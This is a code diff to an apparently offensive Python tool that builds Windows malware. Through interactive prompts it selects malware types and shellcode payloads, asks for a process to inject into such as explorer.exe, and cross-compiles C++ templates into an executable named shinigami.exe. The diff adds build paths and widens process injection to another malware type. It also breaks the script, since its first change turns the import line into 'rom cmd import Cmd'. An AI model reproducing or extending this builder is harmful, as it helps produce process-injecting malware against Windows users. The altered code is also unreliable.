@@ -1,4 +1,4 @@
-from cmd import Cmd
+rom cmd import Cmd
 import os
 from termcolor import colored
 import fileinput
@@ -138,7 +138,7 @@ class MyPrompt(Cmd):
 """)
             Cmd.malware_type = input(colored("[*]", 'cyan') + " Enter The Number For The Malware Type You Want To Use : ")
             print(colored("[*]", 'cyan') + " Using Malware Type " + Cmd.malware_type )
-            if Cmd.malware_type == '4':
+            if Cmd.malware_type == '4' or Cmd.malware_type == '8':
                 Cmd.target_process = input(colored("[*]", 'cyan') + " Specify The Target Process To Inject To (example explorer.exe) (avoid using background processes like svchost.exe) : ")
                 Cmd.target_process = 'pid = FindTarget("' + Cmd.target_process + '");'
 
@@ -201,6 +201,15 @@ class MyPrompt(Cmd):
                 print(colored("[-]", 'red') + "Please Set The Payload First\n")
             elif Cmd.malware_type == '':
                 print(colored("[-]", 'red') + "Please Set The Malware Type\n")
+            elif Cmd.malware_type == '6':
+                os.system("x86_64-w64-mingw32-g++ ./malware/0"+ Cmd.malware_type  + "-malware/*.cpp -fpermissive -o ./ready/shinigami.exe")
+                print (colored("[+]" , 'cyan' ) + " Your Malware is Ready in [ready folder]" )
+            elif Cmd.malware_type == '3':
+                os.system("cp ./malware/0" + Cmd.malware_type + "-malware/malware" + Cmd.malware_type + ".cpp ./malware/0" + Cmd.malware_type + "-malware/" + Cmd.malware_type + ".cpp")
+                os.system("windres ./malware/0" + Cmd.malware_type + "-malware/resources.rc -O coff ./malware/0" + Cmd.malware_type + "-malware/resources.res")
+                os.system("x86_64-w64-mingw32-g++ ./malware/0"+ Cmd.malware_type  + "-malware/" + Cmd.malware_type + ".cpp ./malware/0"+ Cmd.malware_type  + "-malware/resources.res -fpermissive -o ./ready/shinigami.exe")
+                os.system("rm ./malware/0" + Cmd.malware_type + "-malware/" + Cmd.malware_type + ".cpp")
+                print (colored("[+]" , 'cyan' ) + " Your Malware is Ready in [ready folder]" )
             else:
                 os.system("cp ./malware/0" + Cmd.malware_type + "-malware/malware" + Cmd.malware_type + ".cpp ./malware/0" + Cmd.malware_type + "-malware/" + Cmd.malware_type + ".cpp")
                 with open("./malware/xx-shellcodes/payload" + Cmd.payload_type + ".pay", "r") as f:
@@ -235,4 +244,3 @@ if __name__ == '__main__':
     Cmd.malware_type = ''
     Cmd.payload_type = ''
     MyPrompt().cmdloop()
-
